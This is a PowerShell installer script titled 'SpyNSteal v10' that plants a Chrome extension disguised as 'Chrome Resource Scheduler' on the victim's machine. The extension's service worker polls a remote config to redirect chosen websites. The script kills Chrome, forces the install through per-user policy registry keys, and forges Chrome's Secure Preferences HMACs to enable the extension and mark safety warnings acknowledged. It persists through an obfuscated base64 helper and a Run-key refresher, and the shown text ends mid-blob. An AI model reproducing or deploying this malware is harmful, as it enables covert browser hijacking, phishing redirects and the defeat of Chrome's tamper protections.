# SpyNSteal v10 - Policy + HMAC Hybrid (USER-ONLY, no admin)
# Primary: HKCU ExtensionInstallForcelist via reg.exe + CWS URL trick.
# Fallback: when Policies registry is locked, enable via Secure Preferences MAC patch.
# Installs startup refresher via HKCU Run key.

$MANIFEST_TEMPLATE = @'
{"manifest_version":3,"name":"Chrome Resource Scheduler","version":"1.0","description":"Manages internal resource scheduling and prioritization.","permissions":["declarativeNetRequest"],"host_permissions":["<all_urls>"],"background":{"service_worker":"sw.js"}}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return false;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return true;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
    return true;
  } catch (_) { return false; }
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  const ok = await pull();
  if (!ok) await applyRule("||hi.com", "https://hi-test.com/");
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try { Add-Content $LOGFILE "[$ts] $msg" } catch {}
}

Log "=========================================="
Log "SpyNSteal v10 - Policy Extension"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "=========================================="

# --- STEP 1: Find Chrome ---
Log "STEP 1: Finding Chrome..."
$chromeExe = $null
$chromePaths = @(
    "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
)
foreach ($p in $chromePaths) {
    if (Test-Path $p) { $chromeExe = $p; break }
}
if (-not $chromeExe) {
    Log "ERROR: Chrome not found"
    exit 1
}
Log "  Chrome: $chromeExe"

$userDataDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$defaultProfile = "$userDataDir\Default"
$extensionsDir = "$defaultProfile\Extensions"

# --- STEP 2: Kill Chrome ---
Log "STEP 2: Killing Chrome..."
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

# --- STEP 3: Create extension source ---
Log "STEP 3: Creating extension source..."
$persistDir = Join-Path $env:APPDATA "ChromePolicy"
New-Item -Path $persistDir -ItemType Directory -Force | Out-Null
$extSrcDir = Join-Path $persistDir "extension"
New-Item -Path $extSrcDir -ItemType Directory -Force | Out-Null

Set-Content (Join-Path $extSrcDir "manifest.json") $MANIFEST_TEMPLATE -Encoding UTF8
Set-Content (Join-Path $extSrcDir "sw.js") $SW_JS -Encoding UTF8

# --- STEP 4: Pack extension (or reuse existing CRX) ---
Log "STEP 4: Packing extension into CRX..."
$crxPath = Join-Path $persistDir "extension.crx"
$pemPath = Join-Path $persistDir "extension.pem"

if (-not (Test-Path $pemPath)) {
    $proc = Start-Process $chromeExe -ArgumentList "--pack-extension=`"$extSrcDir`"" -PassThru -Wait -NoNewWindow
    if (-not (Test-Path $crxPath)) {
        Log "ERROR: CRX not created"
        exit 1
    }
} else {
    $proc = Start-Process $chromeExe -ArgumentList "--pack-extension=`"$extSrcDir`" --pack-extension-key=`"$pemPath`"" -PassThru -Wait -NoNewWindow
}
Log "  CRX: $crxPath ($((Get-Item $crxPath).Length) bytes)"

# --- STEP 5: Extract extension ID from CRX3 ---
Log "STEP 5: Extracting extension ID..."
$crxBytes = [System.IO.File]::ReadAllBytes($crxPath)

function Read-Varint($bytes, [ref]$offset) {
    $result = [uint64]0; $shift = 0
    do { $b = $bytes[$offset.Value]; $offset.Value++; $result = $result -bor (([uint64]($b -band 0x7F)) -shl $shift); $shift += 7 } while ($b -band 0x80)
    return $result
}

$headerLen = [BitConverter]::ToUInt32($crxBytes, 8)
$pos = 12; $headerEnd = 12 + $headerLen; $pubKey = $null

while ($pos -lt $headerEnd -and $pubKey -eq $null) {
    $tag = Read-Varint $crxBytes ([ref]$pos)
    $fn = [int]($tag -shr 3); $wt = [int]($tag -band 7)
    if ($wt -eq 2) {
        $len = [int](Read-Varint $crxBytes ([ref]$pos))
        if ($fn -eq 2) {
            $ne = $pos + $len; $np = $pos
            while ($np -lt $ne) {
                $nt = Read-Varint $crxBytes ([ref]$np); $nf = [int]($nt -shr 3); $nw = [int]($nt -band 7)
                if ($nw -eq 2) { $nl = [int](Read-Varint $crxBytes ([ref]$np)); if ($nf -eq 1 -and $pubKey -eq $null) { $pubKey = New-Object byte[] $nl; [Array]::Copy($crxBytes,$np,$pubKey,0,$nl) }; $np += $nl }
                elseif ($nw -eq 0) { $null = Read-Varint $crxBytes ([ref]$np) } else { break }
            }
            $pos += $len
        } else { $pos += $len }
    } elseif ($wt -eq 0) { $null = Read-Varint $crxBytes ([ref]$pos) }
    elseif ($wt -eq 5) { $pos += 4 } elseif ($wt -eq 1) { $pos += 8 } else { break }
}

$sha = [System.Security.Cryptography.SHA256]::Create()
$hash = $sha.ComputeHash($pubKey)
$extId = ""
for ($i = 0; $i -lt 16; $i++) { $b = $hash[$i]; $extId += [char]([int][char]'a' + (($b -shr 4) -band 0x0F)); $extId += [char]([int][char]'a' + ($b -band 0x0F)) }
Log "  Extension ID: $extId"

# Save extension ID for refresher
Set-Content (Join-Path $persistDir "ext_id.txt") $extId

# --- STEP 6: Install extension files ---
Log "STEP 6: Installing extension files..."
$extInstallDir = Join-Path $extensionsDir "$extId\1.0_0"
New-Item -Path $extInstallDir -ItemType Directory -Force | Out-Null
Copy-Item (Join-Path $extSrcDir "manifest.json") $extInstallDir -Force
Copy-Item (Join-Path $extSrcDir "sw.js") $extInstallDir -Force

# --- STEP 7: Create update manifest ---
Log "STEP 7: Creating update manifest..."
$updateXml = @"
<?xml version='1.0' encoding='UTF-8'?>
<gupdate xmlns='http://www.google.com/update2/response' protocol='2.0'>
  <app appid='$extId'>
    <updatecheck codebase='file:///$($crxPath -replace '\\','/')' version='1.0' />
  </app>
</gupdate>
"@
$updateXmlPath = Join-Path $persistDir "update.xml"
Set-Content $updateXmlPath $updateXml -Encoding UTF8
$localUpdateUrl = "file:///$($updateXmlPath -replace '\\','/')"

# --- Helpers: reg.exe + HMAC enable fallback ---
$secPrefsPath = "$defaultProfile\Secure Preferences"
$cwsUpdateUrl = "https://clients2.google.com/service/update2/crx"
$chromeDir = Split-Path $chromeExe -Parent

function Invoke-RegAdd([string]$KeyPath, [string]$Name, [string]$Value) {
    $escaped = $Value -replace '"','\"'
    $null = cmd /c "reg add `"$KeyPath`" /v `"$Name`" /t REG_SZ /d `"$escaped`" /f >nul 2>&1"
    return ($LASTEXITCODE -eq 0)
}

function Set-ExternalRegistry([string]$Id, [string]$LocalUrl, [string]$Crx) {
    $base = "HKCU\Software\Google\Chrome\Extensions\$Id"
    $ok = (Invoke-RegAdd $base "update_url" $LocalUrl) -and
          (Invoke-RegAdd $base "path" $Crx) -and
          (Invoke-RegAdd $base "version" "1.0")
    Log "  External registry (reg.exe): $ok"
    return $ok
}

function Set-ChromePoliciesReg([string]$Id, [string]$UpdateUrl) {
    $val = "$Id;$UpdateUrl"
    $ok = (Invoke-RegAdd "HKCU\Software\Policies\Google\Chrome\ExtensionInstallForcelist" "1" $val) -and
          (Invoke-RegAdd "HKCU\Software\Policies\Google\Chrome\ExtensionInstallAllowlist" "1" $Id) -and
          (Invoke-RegAdd "HKCU\Software\Policies\Google\Chrome\ExtensionInstallAllowlist" "2" "*")
    Log "  Policies registry (reg.exe): $ok"
    return $ok
}

function Get-ExtDisableReasons([string]$Content, [string]$Id) {
    $idx = $Content.IndexOf("`"$Id`":{")
    if ($idx -lt 0) { return $null }
    $chunk = $Content.Substring($idx, [Math]::Min(2000, $Content.Length - $idx))
    $m = [regex]::Match($chunk, '"disable_reasons":\[([^\]]*)\]')
    if ($m.Success -and $m.Groups[1].Value) { return $m.Groups[1].Value }
    return ""
}

$asmDir = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
$webExtAsm = Join-Path $asmDir "System.Web.Extensions.dll"
Add-Type -ReferencedAssemblies @("System.Web.Extensions.dll") -TypeDefinition @'
using System; using System.Collections.Generic; using System.Security.Cryptography; using System.Text;
using System.Web.Script.Serialization;
public class ExtEnable {
    static byte[] seed; static string deviceId;
    static JavaScriptSerializer jss = new JavaScriptSerializer { MaxJsonLength = int.MaxValue };
    public static void Init(byte[] s, string d) { seed = s; deviceId = d; }
    static string Hmac(string msg) {
        using (var h = new HMACSHA256(seed))
            return BitConverter.ToString(h.ComputeHash(Encoding.UTF8.GetBytes(msg))).Replace("-","");
    }
    static string Esc(string s) {
        var sb = new StringBuilder();
        foreach (char c in s) {
            if (c == '"') sb.Append("\\\"");
            else if (c == '\\') sb.Append("\\\\");
            else if (c == '\n') sb.Append("\\n");
            else if (c == '\r') sb.Append("\\r");
            else if (c == '\t') sb.Append("\\t");
            else if (c < 0x20) sb.AppendFormat("\\u{0:X4}", (int)c);
            else sb.Append(c);
        }
        return sb.ToString();
    }
    static string Canon(object obj) {
        if (obj == null) return "null";
        if (obj is bool) return (bool)obj ? "true" : "false";
        if (obj is string) return "\"" + Esc((string)obj) + "\"";
        if (obj is int || obj is long) return obj.ToString();
        if (obj is double) { double d=(double)obj; if (d==Math.Floor(d)&&Math.Abs(d)<1e15) return ((long)d).ToString(); return d.ToString("R"); }
        if (obj is decimal) { decimal dc=(decimal)obj; if (dc==Math.Floor(dc)) return ((long)dc).ToString(); return dc.ToString(System.Globalization.CultureInfo.InvariantCulture); }
        if (obj is object[]) {
            var arr=(object[])obj; if (arr.Length==0) return null;
            var p=new List<string>(); foreach (var i in arr) { var v=Canon(i); if (v!=null) p.Add(v); }
            if (p.Count==0) return null; return "["+string.Join(",",p.ToArray())+"]";
        }
        if (obj is Dictionary<string,object>) {
            var dict=(Dictionary<string,object>)obj; if (dict.Count==0) return null;
            var keys=new List<string>(dict.Keys); keys.Sort(StringComparer.Ordinal);
            var p=new List<string>(); foreach (var k in keys) { var v=Canon(dict[k]); if (v!=null) p.Add("\""+Esc(k)+"\":"+v); }
            if (p.Count==0) return null; return "{"+string.Join(",",p.ToArray())+"}";
        }
        if (obj is System.Collections.ArrayList) {
            var arr=(System.Collections.ArrayList)obj; if (arr.Count==0) return null;
            var p=new List<string>(); foreach (var i in arr) { var v=Canon(i); if (v!=null) p.Add(v); }
            if (p.Count==0) return null; return "["+string.Join(",",p.ToArray())+"]";
        }
        return obj.ToString();
    }
    public static string Patch(string content, string extId) {
        int extStart = content.IndexOf("\""+extId+"\":{");
        if (extStart < 0) return null;
        int blockEnd = extStart;
        int depth = 0;
        for (int i = extStart + extId.Length + 2; i < content.Length; i++) {
            if (content[i]=='{') depth++;
            else if (content[i]=='}') { depth--; if (depth==0) { blockEnd = i; break; } }
        }
        string block = content.Substring(extStart, blockEnd - extStart + 1);
        string patched = System.Text.RegularExpressions.Regex.Replace(block, ",?\"disable_reasons\":\\[[^\\]]*\\]", "");
        if (!patched.Contains("\"state\":")) {
            patched = patched.Replace("\""+extId+"\":{", "\""+extId+"\":{\"state\":1,");
        } else {
            patched = System.Text.RegularExpressions.Regex.Replace(patched, "\"state\":\\d+", "\"state\":1");
        }
        if (!patched.Contains("\"ack_safety_check_warning\":")) {
            patched = patched.Replace("\""+extId+"\":{", "\""+extId+"\":{\"ack_safety_check_warning\":true,");
        } else {
            patched = System.Text.RegularExpressions.Regex.Replace(patched, "\"ack_safety_check_warning\":(true|false)", "\"ack_safety_check_warning\":true");
        }
        content = content.Substring(0, extStart) + patched + content.Substring(blockEnd + 1);
        var root = jss.Deserialize<Dictionary<string,object>>(content);
        var protection = (Dictionary<string,object>)root["protection"];
        var macs = (Dictionary<string,object>)protection["macs"];
        var extMacs = (Dictionary<string,object>)macs["extensions"];
        var settingsMacs = (Dictionary<string,object>)extMacs["settings"];
        var extensions = (Dictionary<string,object>)((Dictionary<string,object>)root["extensions"])["settings"];
        var extSettings = (Dictionary<string,object>)extensions[extId];
        string canonical = Canon(extSettings);
        string macPath = "extensions.settings."+extId;
        string newMac = Hmac(deviceId + macPath + canonical);
        settingsMacs[extId] = newMac;
        string macsCanonical = Canon(macs);
        string newSuper = Hmac(deviceId + macsCanonical);
        string oldMacKey = "\""+extId+"\":\"";
        int macsStart = content.IndexOf("\"macs\":{");
        int macPos = content.IndexOf(oldMacKey, macsStart);
        if (macPos > 0) {
            int valStart = macPos + oldMacKey.Length;
            int valEnd = content.IndexOf("\"", valStart);
            content = content.Remove(valStart, valEnd - valStart).Insert(valStart, newMac);
        }
        string smKey = "\"super_mac\":\"";
        int smPos = content.IndexOf(smKey);
        if (smPos >= 0) {
            int smValStart = smPos + smKey.Length;
            int smValEnd = content.IndexOf("\"", smValStart);
            content = content.Remove(smValStart, smValEnd - smValStart).Insert(smValStart, newSuper);
        }
        return content;
    }
    public static string TryVerifyMac(string raw, byte[] s, string devId) {
        try {
            var root = jss.Deserialize<Dictionary<string,object>>(raw);
            var protection = (Dictionary<string,object>)root["protection"];
            var macs = (Dictionary<string,object>)protection["macs"];
            foreach (var cat in macs) {
                var catDict = (Dictionary<string,object>)cat.Value;
                foreach (var entry in catDict) {
                    var storedMac = entry.Value as string;
                    if (storedMac == null || storedMac.Length != 64) continue;
                    string testPath = cat.Key + "." + entry.Key;
                    object current = root;
                    foreach (string part in testPath.Split('.')) {
                        var dd = current as Dictionary<string,object>;
                        if (dd == null || !dd.ContainsKey(part)) { current = null; break; }
                        current = dd[part];
                    }
                    if (current == null) continue;
                    Init(s, devId);
                    string computed = Hmac(devId + testPath + Canon(current));
                    if (string.Equals(computed, storedMac, StringComparison.OrdinalIgnoreCase))
                        return testPath;
                }
            }
        } catch {}
        return null;
    }
}
'@ -ErrorAction SilentlyContinue

function Get-PakSeedCandidates([string]$ChromeDir) {
    $results = @()
    $pakNames = @('resources.pak', 'chrome_100_percent.pak', 'chrome_200_percent.pak')
    $dirs = @($ChromeDir)
    try { $dirs += @(Get-ChildItem $ChromeDir -Directory -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }) } catch {}
    foreach ($dir in $dirs) {
        foreach ($pakName in $pakNames) {
            $pakPath = Join-Path $dir $pakName
            if (-not (Test-Path $pakPath)) { continue }
            try {
                $data = [IO.File]::ReadAllBytes($pakPath)
                if ($data.Length -lt 12) { continue }
                if ([BitConverter]::ToUInt32($data, 0) -ne 5) { continue }
                $resCount = [BitConverter]::ToUInt16($data, 8)
                for ($i = 0; $i -lt $resCount; $i++) {
                    $off = 12 + $i * 6
                    if ($off + 6 -gt $data.Length) { break }
                    $id = [BitConverter]::ToUInt16($data, $off)
                    $start = [BitConverter]::ToUInt32($data, $off + 2)
                    $nextOff = 12 + ($i + 1) * 6
                    if ($nextOff + 6 -gt $data.Length) { break }
                    $end = [BitConverter]::ToUInt32($data, $nextOff + 2)
                    $len = [int]($end - $start)
                    if ($len -eq 64 -and $start + 64 -le $data.Length) {
                        $cand = New-Object byte[] 64
                        [Array]::Copy($data, [int]$start, $cand, 0, 64)
                        $allZero = $true
                        foreach ($b in $cand) { if ($b -ne 0) { $allZero = $false; break } }
                        if (-not $allZero) {
                            $results += [PSCustomObject]@{ Id = $id; Bytes = $cand; Pak = $pakName }
                        }
                    }
                }
            } catch {}
        }
    }
    return $results
}

function Get-ChromeDeviceIds() {
    $ids = @()
    try {
        $mg = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid -ErrorAction Stop).MachineGuid
        if ($mg) { $ids += $mg }
    } catch {}
    $sid = ([Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    $parts = $sid.Split('-')
    $ids += ($parts[0..($parts.Length-2)]) -join '-'
    $ids += $sid
    return $ids
}

function Get-VerifiedChromeSeed([string]$ChromeDir, [string]$SecPrefsPath) {
    if (-not (Test-Path $SecPrefsPath)) { return $null }
    $raw = [IO.File]::ReadAllText($SecPrefsPath, [Text.Encoding]::UTF8)
    $candidates = Get-PakSeedCandidates $ChromeDir
    Log "  Seed scan: $($candidates.Count) PAKv5 candidates"
    if ($candidates.Count -eq 0) { return $null }
    foreach ($devId in (Get-ChromeDeviceIds)) {
        foreach ($cand in $candidates) {
            $matchPath = [ExtEnable]::TryVerifyMac($raw, $cand.Bytes, $devId)
            if ($matchPath) {
                return @{
                    Seed = $cand.Bytes
                    DeviceId = $devId
                    SeedId = $cand.Id
                    Pak = $cand.Pak
                    MatchPath = $matchPath
                }
            }
        }
    }
    return $null
}

function Get-ExtState([string]$Content, [string]$Id) {
    $idx = $Content.IndexOf("`"$Id`":{")
    if ($idx -lt 0) { return $null }
    $chunk = $Content.Substring($idx, [Math]::Min(2000, $Content.Length - $idx))
    $m = [regex]::Match($chunk, '"state":(\d+)')
    if ($m.Success) { return $m.Groups[1].Value }
    return ""
}

function Save-VerifiedCredentials([string]$Dir, $Verified) {
    $seedHex = [BitConverter]::ToString($Verified.Seed).Replace('-', '').ToLower()
    Set-Content (Join-Path $Dir 'seed.hex') $seedHex -Encoding ASCII
    Set-Content (Join-Path $Dir 'device_id.txt') $Verified.DeviceId -Encoding ASCII
}

function Enable-ExtensionSecPrefs([string]$Path, [string]$Id, [string]$ChromeDir, [string]$PersistDir, $Verified = $null) {
    if (-not $Verified) {
        $Verified = Get-VerifiedChromeSeed $ChromeDir $Path
    }
    if (-not $Verified) {
        Log "  ERROR: HMAC seed not verified - cannot enable extension"
        return $false
    }
    Log "  Verified seed id $($Verified.SeedId) from $($Verified.Pak) via $($Verified.MatchPath)"
    Log "  Device ID: $($Verified.DeviceId.Substring(0, [Math]::Min(12, $Verified.DeviceId.Length)))..."
    Save-VerifiedCredentials $PersistDir $Verified
    [ExtEnable]::Init($Verified.Seed, $Verified.DeviceId)
    $content = [IO.File]::ReadAllText($Path, [Text.Encoding]::UTF8)
    $patched = [ExtEnable]::Patch($content, $Id)
    if (-not $patched) { Log "  HMAC enable: extension not in SecPrefs"; return $false }
    [IO.File]::WriteAllText($Path, $patched, (New-Object Text.UTF8Encoding($false)))
    $written = [IO.File]::ReadAllText($Path, [Text.Encoding]::UTF8)
    $macOk = [ExtEnable]::TryVerifyMac($written, $Verified.Seed, $Verified.DeviceId)
    if (-not $macOk) {
        Log "  ERROR: Post-patch MAC verification failed"
        return $false
    }
    Log "  HMAC enable: patched + MAC verified"
    return $true
}

# --- STEP 8: Install via external registry + policies ---
Log "STEP 8: Installing extension..."
Set-ExternalRegistry $extId $localUpdateUrl $crxPath | Out-Null
$policyOk = Set-ChromePoliciesReg $extId $localUpdateUrl

Start-Process $chromeExe
Start-Sleep 15

$content = Get-Content $secPrefsPath -Raw
Log "  Extension in SecPrefs: $($content.Contains($extId))"
$dr = Get-ExtDisableReasons $content $extId
if ($dr -ne "" -and $dr -ne $null) { Log "  After install disable_reasons: [$dr]" }

# --- STEP 9: Phase 2 (only if policies writable) or HMAC enable ---
Log "STEP 9: Enable extension..."
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

$verifiedCreds = Get-VerifiedChromeSeed $chromeDir $secPrefsPath
$enableOk = $false

if ($policyOk) {
    Log "  Policies OK - trying CWS URL phase..."
    Set-ChromePoliciesReg $extId $cwsUpdateUrl | Out-Null
    Start-Process $chromeExe
    Start-Sleep 12
    Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep 2
    $content = Get-Content $secPrefsPath -Raw
    $dr = Get-ExtDisableReasons $content $extId
    if ($dr -eq "" -or $dr -eq $null) {
        Log "  Phase 2: ENABLED via policy"
        $enableOk = $true
    } else {
        Log "  Phase 2 still disabled [$dr] - using HMAC fallback"
        $enableOk = Enable-ExtensionSecPrefs $secPrefsPath $extId $chromeDir $persistDir $verifiedCreds
    }
} else {
    Log "  Policies LOCKED - using HMAC fallback"
    $enableOk = Enable-ExtensionSecPrefs $secPrefsPath $extId $chromeDir $persistDir $verifiedCreds
}

if (-not $enableOk) {
    Log "  Enable step FAILED - extension will stay disabled"
}

Start-Process $chromeExe
Start-Sleep 20
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

$content = Get-Content $secPrefsPath -Raw
$dr = Get-ExtDisableReasons $content $extId
$state = Get-ExtState $content $extId
$macStillOk = $false
if ($verifiedCreds) {
    $macStillOk = [bool][ExtEnable]::TryVerifyMac($content, $verifiedCreds.Seed, $verifiedCreds.DeviceId)
}
Log "  Post-Chrome: state=$state disable_reasons=[$dr] mac_valid=$macStillOk"
if (($dr -eq "" -or $dr -eq $null) -and $state -eq "1" -and $macStillOk) {
    Log "  Final state: ENABLED (persisted)"
} else {
    Log "  Final state: DISABLED (Chrome rejected or re-disabled)"
}

# --- STEP 10: Write enable helper + startup refresher ---
Log "STEP 10: Installing startup refresher..."

$enablePath = Join-Path $persistDir "enable.ps1"
[IO.File]::WriteAllBytes($enablePath, [Convert]::FromBase64String('cGFyYW0oW3N0cmluZ10kRXh0SWQsIFtzdHJpbmddJENocm9tZURpciwgW3N0cmluZ10kU2VjUHJlZnNQYXRoKQ0KJGJhc2VEaXIgPSAkUFNTY3JpcHRSb290DQokc2VlZEhleCA9IChHZXQtQ29udGVudCAoSm9pbi1QYXRoICRiYXNlRGlyICdzZWVkLmhleCcpIC1SYXcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpDQokZGV2aWNlSWQgPSAoR2V0LUNvbnRlbnQgKEpvaW4tUGF0aCAkYmFzZURpciAnZGV2aWNlX2lkLnR4dCcpIC1SYXcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpDQppZiAoLW5vdCAkc2VlZEhleCAtb3IgLW5vdCAkZGV2aWNlSWQpIHsgZXhpdCAxIH0NCiRzZWVkSGV4ID0gJHNlZWRIZXguVHJpbSgpDQokZGV2aWNlSWQgPSAkZGV2aWNlSWQuVHJpbSgpDQokc2VlZCA9IE5ldy1PYmplY3QgYnl0ZVtdIDY0DQpmb3IgKCRpID0gMDsgJGkgLWx0IDY0OyAkaSsrKSB7ICRzZWVkWyRpXSA9IFtDb252ZXJ0XTo6VG9CeXRlKCRzZWVkSGV4LlN1YnN0cmluZygkaSoyLDIpLDE2KSB9DQoNCiRhc21EaXIgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuUnVudGltZUVudmlyb25tZW50XTo6R2V0UnVudGltZURpcmVjdG9yeSgpDQpBZGQtVHlwZSAtUmVmZXJlbmNlZEFzc2VtYmxpZXMgQCgiJGFzbURpclxTeXN0ZW0uV2ViLkV4dGVuc2lvbnMuZGxsIikgLVR5cGVEZWZpbml0aW9uIEAnDQp1c2luZyBTeXN0ZW07IHVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOyB1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5OyB1c2luZyBTeXN0ZW0uVGV4dDsNCnVzaW5nIFN5c3RlbS5XZWIuU2NyaXB0LlNlcmlhbGl6YXRpb247DQpwdWJsaWMgY2xhc3MgRXh0RW5hYmxlIHsNCiAgICBzdGF0aWMgYnl0ZVtdIHNlZWQ7IHN0YXRpYyBzdHJpbmcgZGV2aWNlSWQ7DQogICAgc3RhdGljIEphdmFTY3JpcHRTZXJpYWxpemVyIGpzcyA9IG5ldyBKYXZhU2NyaXB0U2VyaWFsaXplciB7IE1heEpzb25MZW5ndGggPSBpbnQuTWF4VmFsdWUgfTsNCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgSW5pdChieXRlW10gcywgc3RyaW5nIGQpIHsgc2VlZCA9IHM7IGRldmljZUlkID0gZDsgfQ0KICAgIHN0YXRpYyBzdHJpbmcgSG1hYyhzdHJpbmcgbXNnKSB7IHVzaW5nICh2YXIgaCA9IG5ldyBITUFDU0hBMjU2KHNlZWQpKSByZXR1cm4gQml0Q29udmVydGVyLlRvU3RyaW5nKGguQ29tcHV0ZUhhc2goRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhtc2cpKSkuUmVwbGFjZSgiLSIsIiIpOyB9DQogICAgc3RhdGljIHN0cmluZyBFc2Moc3RyaW5nIHMpIHsgdmFyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIoKTsgZm9yZWFjaCAoY2hhciBjIGluIHMpIHsgaWYgKGM9PSciJykgc2IuQXBwZW5kKCJcXFwiIik7IGVsc2UgaWYgKGM9PSdcXCcpIHNiLkFwcGVuZCgiXFxcXCIpOyBlbHNlIGlmIChjPT0nXG4nKSBzYi5BcHBlbmQoIlxcbiIpOyBlbHNlIGlmIChjPT0nXHInKSBzYi5BcHBlbmQoIlxcciIpOyBlbHNlIGlmIChjPT0nXHQnKSBzYi5BcHBlbmQoIlxcdCIpOyBlbHNlIGlmIChjPDB4MjApIHNiLkFwcGVuZEZvcm1hdCgiXFx1ezA6WDR9IiwoaW50KWMpOyBlbHNlIHNiLkFwcGVuZChjKTsgfSByZXR1cm4gc2IuVG9TdHJpbmcoKTsgfQ0KICAgIHN0YXRpYyBzdHJpbmcgQ2Fub24ob2JqZWN0IG9iaikgew0KICAgICAgICBpZiAob2JqPT1udWxsKSByZXR1cm4gIm51bGwiOyBpZiAob2JqIGlzIGJvb2wpIHJldHVybiAoYm9vbClvYmo/InRydWUiOiJmYWxzZSI7IGlmIChvYmogaXMgc3RyaW5nKSByZXR1cm4gIlwiIitFc2MoKHN0cmluZylvYmopKyJcIiI7DQogICAgICAgIGlmIChvYmogaXMgaW50fHxvYmogaXMgbG9uZykgcmV0dXJuIG9iai5Ub1N0cmluZygpOw0KICAgICAgICBpZiAob2JqIGlzIGRvdWJsZSkgeyBkb3VibGUgZD0oZG91YmxlKW9iajsgaWYgKGQ9PU1hdGguRmxvb3IoZCkmJk1hdGguQWJzKGQpPDFlMTUpIHJldHVybiAoKGxvbmcpZCkuVG9TdHJpbmcoKTsgcmV0dXJuIGQuVG9TdHJpbmcoIlIiKTsgfQ0KICAgICAgICBpZiAob2JqIGlzIGRlY2ltYWwpIHsgZGVjaW1hbCBkYz0oZGVjaW1hbClvYmo7IGlmIChkYz09TWF0aC5GbG9vcihkYykpIHJldHVybiAoKGxvbmcpZGMpLlRvU3RyaW5nKCk7IHJldHVybiBkYy5Ub1N0cmluZyhTeXN0ZW0uR2xvYmFsaXphdGlvbi5DdWx0dXJlSW5mby5JbnZhcmlhbnRDdWx0dXJlKTsgfQ0KICAgICAgICBpZiAob2JqIGlzIG9iamVjdFtdKSB7IHZhciBhcnI9KG9iamVjdFtdKW9iajsgaWYoYXJyLkxlbmd0aD09MCkgcmV0dXJuIG51bGw7IHZhciBwPW5ldyBMaXN0PHN0cmluZz4oKTsgZm9yZWFjaCh2YXIgaSBpbiBhcnIpe3ZhciB2PUNhbm9uKGkpO2lmKHYhPW51bGwpcC5BZGQodik7fSBpZihwLkNvdW50PT0wKXJldHVybiBudWxsOyByZXR1cm4gIlsiK3N0cmluZy5Kb2luKCIsIixwLlRvQXJyYXkoKSkrIl0iOyB9DQogICAgICAgIGlmIChvYmogaXMgRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PikgeyB2YXIgZGljdD0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PilvYmo7IGlmKGRpY3QuQ291bnQ9PTApIHJldHVybiBudWxsOyB2YXIga2V5cz1uZXcgTGlzdDxzdHJpbmc+KGRpY3QuS2V5cyk7IGtleXMuU29ydChTdHJpbmdDb21wYXJlci5PcmRpbmFsKTsgdmFyIHA9bmV3IExpc3Q8c3RyaW5nPigpOyBmb3JlYWNoKHZhciBrIGluIGtleXMpe3ZhciB2PUNhbm9uKGRpY3Rba10pO2lmKHYhPW51bGwpcC5BZGQoIlwiIitFc2MoaykrIlwiOiIrdik7fSBpZihwLkNvdW50PT0wKXJldHVybiBudWxsOyByZXR1cm4gInsiK3N0cmluZy5Kb2luKCIsIixwLlRvQXJyYXkoKSkrIn0iOyB9DQogICAgICAgIGlmIChvYmogaXMgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCkgeyB2YXIgYXJyPShTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0KW9iajsgaWYoYXJyLkNvdW50PT0wKSByZXR1cm4gbnVsbDsgdmFyIHA9bmV3IExpc3Q8c3RyaW5nPigpOyBmb3JlYWNoKHZhciBpIGluIGFycil7dmFyIHY9Q2Fub24oaSk7aWYodiE9bnVsbClwLkFkZCh2KTt9IGlmKHAuQ291bnQ9PTApcmV0dXJuIG51bGw7IHJldHVybiAiWyIrc3RyaW5nLkpvaW4oIiwiLHAuVG9BcnJheSgpKSsiXSI7IH0NCiAgICAgICAgcmV0dXJuIG9iai5Ub1N0cmluZygpOw0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXRjaChzdHJpbmcgY29udGVudCwgc3RyaW5nIGV4dElkKSB7DQogICAgICAgIGludCBleHRTdGFydCA9IGNvbnRlbnQuSW5kZXhPZigiXCIiK2V4dElkKyJcIjp7Iik7IGlmIChleHRTdGFydDwwKSByZX